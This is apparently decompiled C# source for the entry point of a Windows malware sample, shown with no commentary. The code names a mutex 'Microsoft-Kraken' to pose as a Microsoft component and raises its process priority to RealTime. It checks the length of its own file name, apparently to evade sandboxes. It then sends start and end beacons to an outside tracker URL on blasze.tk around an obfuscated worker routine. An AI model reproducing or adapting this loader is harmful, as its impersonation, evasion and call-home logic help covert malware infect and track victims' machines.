using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using ns0;
using ns3;

namespace Main;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		try
		{
			int processorCount = Environment.ProcessorCount;
			if (processorCount != -1 || processorCount != 0 || processorCount != 1)
			{
				using Process process = Process.GetCurrentProcess();
				switch (processorCount)
				{
				default:
					process.PriorityClass = ProcessPriorityClass.RealTime;
					break;
				case 3:
					process.PriorityClass = ProcessPriorityClass.High;
					break;
				case 2:
					process.PriorityClass = ProcessPriorityClass.AboveNormal;
					break;
				}
			}
		}
		catch (Exception)
		{
		}
		new Mutex(initiallyOwned: true, $"Microsoft-Kraken-{Environment.MachineName}", out var createdNew);
		if (!createdNew)
		{
			Environment.Exit(0);
		}
		bool flag = false;
		int[] array = new int[3] { 32, 48, 64 };
		foreach (int num in array)
		{
			if (new FileInfo(Application.get_ExecutablePath()).Name.Length == num - ".exe".Length)
			{
				flag = true;
			}
		}
		if (Class21.smethod_25() && !flag)
		{
			Class21.smethod_44("StartU", "http://blasze.tk/CN18R3");
			Thread thread = new Thread((ThreadStart)delegate
			{
				Class21.smethod_83();
			});
			thread.Start();
			thread.Join();
			Class21.smethod_44("End:" + Class11.long_0, "http://blasze.tk/CN18R3");
			Class21.smethod_18();
		}
		Class21.smethod_91(0);
	}
}
